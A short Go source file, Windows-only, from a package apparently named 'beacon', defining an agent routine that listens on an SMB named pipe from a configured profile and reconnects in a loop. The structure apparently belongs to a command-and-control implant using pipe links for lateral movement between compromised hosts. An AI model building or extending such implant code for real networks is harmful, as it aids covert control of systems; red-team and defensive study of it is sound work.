//go:build windows

package core

import (
	"beacon/pkg/cascade"
	"beacon/pkg/profile"
)

func (a *Agent) runInternalSMB() int {
	for a.shouldRunInternal() {
		pipeName := profile.GlobalProfile.SMBInternal.PipeName

		link, err := cascade.ListenSMB(pipeName)
		if err != nil {
			a.internalReconnectDelay()
			continue
		}
		_ = a.runInternal(link)
		a.internalReconnectDelay()
	}
	return 0
}
